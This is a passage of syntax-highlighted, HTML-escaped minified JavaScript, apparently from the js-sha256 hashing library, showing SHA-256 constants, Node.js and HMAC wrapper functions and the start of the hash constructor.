class="o">!==&lt;/span>&lt;span class="s1">&amp;#39;undefined&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">HEX_CHARS&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;0123456789abcdef&amp;#39;&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">split&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;&amp;#39;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">EXTRA&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">2147483648&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">8388608&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">32768&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">128&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">SHIFT&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">24&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">K&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mh">0x428a2f98&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x71374491&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0xb5c0fbcf&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0xe9b5dba5&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x3956c25b&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x59f111f1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x923f82a4&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0xab1c5ed5&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0xd807aa98&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x12835b01&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x243185be&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x550c7dc3&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x72be5d74&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x80deb1fe&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x9bdc06a7&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0xc19bf174&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0xe49b69c1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0xefbe4786&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x0fc19dc6&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x240ca1cc&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x2de92c6f&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x4a7484aa&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x5cb0a9dc&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x76f988da&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x983e5152&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0xa831c66d&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0xb00327c8&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0xbf597fc7&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0xc6e00bf3&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0xd5a79147&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x06ca6351&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x14292967&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x27b70a85&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x2e1b2138&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x4d2c6dfc&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x53380d13&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x650a7354&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x766a0abb&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x81c2c92e&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x92722c85&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0xa2bfe8a1&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0xa81a664b&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0xc24b8b70&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0xc76c51a3&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0xd192e819&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0xd6990624&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0xf40e3585&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x106aa070&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x19a4c116&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x1e376c08&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x2748774c&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x34b0bcb5&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x391c0cb3&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x4ed8aa4a&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x5b9cca4f&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x682e6ff3&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x748f82ee&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x78a5636f&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x84c87814&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x8cc70208&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0x90befffa&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0xa4506ceb&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0xbef9a3f7&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mh">0xc67178f2&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">OUTPUT_TYPES&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;hex&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;array&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;digest&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;arrayBuffer&amp;#39;&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">blocks&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[];&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">JS_SHA256_NO_NODE_JS&lt;/span>&lt;span class="o">||!&lt;/span>&lt;span class="nb">Array&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">isArray&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nb">Array&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">isArray&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kd">function&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">obj&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">return&lt;/span> &lt;span class="nb">Object&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">prototype&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">toString&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">call&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">obj&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="s1">&amp;#39;[object Array]&amp;#39;&lt;/span>&lt;span class="p">}}&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ARRAY_BUFFER&lt;/span>&lt;span class="o">&amp;amp;&amp;amp;&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW&lt;/span>&lt;span class="o">||!&lt;/span>&lt;span class="nx">ArrayBuffer&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">isView&lt;/span>&lt;span class="p">)){&lt;/span>&lt;span class="nx">ArrayBuffer&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">isView&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kd">function&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">obj&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">return&lt;/span> &lt;span class="k">typeof&lt;/span> &lt;span class="nx">obj&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="s1">&amp;#39;object&amp;#39;&lt;/span>&lt;span class="o">&amp;amp;&amp;amp;&lt;/span>&lt;span class="nx">obj&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">buffer&lt;/span>&lt;span class="o">&amp;amp;&amp;amp;&lt;/span>&lt;span class="nx">obj&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">buffer&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">constructor&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="nx">ArrayBuffer&lt;/span>&lt;span class="p">}}&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">createOutputMethod&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kd">function&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">outputType&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">is224&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">return&lt;/span> &lt;span class="kd">function&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">return&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">Sha256&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">is224&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">update&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="p">)[&lt;/span>&lt;span class="nx">outputType&lt;/span>&lt;span class="p">]()}};&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">createMethod&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kd">function&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">is224&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">createOutputMethod&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;hex&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">is224&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">NODE_JS&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">nodeWrap&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">method&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">is224&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="nx">method&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">create&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kd">function&lt;/span>&lt;span class="p">(){&lt;/span>&lt;span class="k">return&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">Sha256&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">is224&lt;/span>&lt;span class="p">)};&lt;/span>&lt;span class="nx">method&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">update&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kd">function&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">return&lt;/span> &lt;span class="nx">method&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">create&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="nx">update&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="p">)};&lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nx">OUTPUT_TYPES&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">length&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">OUTPUT_TYPES&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="nx">method&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">type&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">createOutputMethod&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">type&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">is224&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="k">return&lt;/span> &lt;span class="nx">method&lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">nodeWrap&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kd">function&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">method&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">is224&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">crypto&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nb">eval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;require(&amp;#39;crypto&amp;#39;)&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">Buffer&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nb">eval&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;require(&amp;#39;buffer&amp;#39;).Buffer&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">algorithm&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">is224&lt;/span>&lt;span class="o">?&lt;/span>&lt;span class="s1">&amp;#39;sha224&amp;#39;&lt;/span>&lt;span class="o">:&lt;/span>&lt;span class="s1">&amp;#39;sha256&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">nodeMethod&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kd">function&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">typeof&lt;/span> &lt;span class="nx">message&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="s1">&amp;#39;string&amp;#39;&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">return&lt;/span> &lt;span class="nx">crypto&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">createHash&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">algorithm&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">update&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="s1">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">digest&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;hex&amp;#39;&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="kc">null&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="kc">undefined&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">throw&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nb">Error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">ERROR&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="k">else&lt;/span> &lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">constructor&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="nx">ArrayBuffer&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">new&lt;/span> &lt;span class="nx">Uint8Array&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="p">)}}&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nb">Array&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">isArray&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="nx">ArrayBuffer&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">isView&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">constructor&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="nx">Buffer&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">return&lt;/span> &lt;span class="nx">crypto&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">createHash&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">algorithm&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">update&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">new&lt;/span> &lt;span class="nx">Buffer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="p">)).&lt;/span>&lt;span class="nx">digest&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;hex&amp;#39;&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="k">return&lt;/span> &lt;span class="nx">method&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="p">)}};&lt;/span>&lt;span class="k">return&lt;/span> &lt;span class="nx">nodeMethod&lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">createHmacOutputMethod&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kd">function&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">outputType&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">is224&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">return&lt;/span> &lt;span class="kd">function&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">return&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">HmacSha256&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">is224&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="kc">true&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">update&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="p">)[&lt;/span>&lt;span class="nx">outputType&lt;/span>&lt;span class="p">]()}};&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">createHmacMethod&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kd">function&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">is224&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">createHmacOutputMethod&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;hex&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">is224&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">method&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">create&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kd">function&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">return&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">HmacSha256&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">is224&lt;/span>&lt;span class="p">)};&lt;/span>&lt;span class="nx">method&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">update&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kd">function&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">return&lt;/span> &lt;span class="nx">method&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">create&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">key&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">update&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">message&lt;/span>&lt;span class="p">)};&lt;/span>&lt;span class="k">for&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nx">OUTPUT_TYPES&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">length&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="kd">var&lt;/span> &lt;span class="nx">type&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">OUTPUT_TYPES&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="nx">method&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">type&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">createHmacOutputMethod&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">type&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">is224&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="k">return&lt;/span> &lt;span class="nx">method&lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="kd">function&lt;/span> &lt;span class="nx">Sha256&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">is224&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">sharedMemory&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">sharedMemory&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">9&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">11&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">13&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">14&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">15&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="k">else&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="k">this&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">blocks&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span 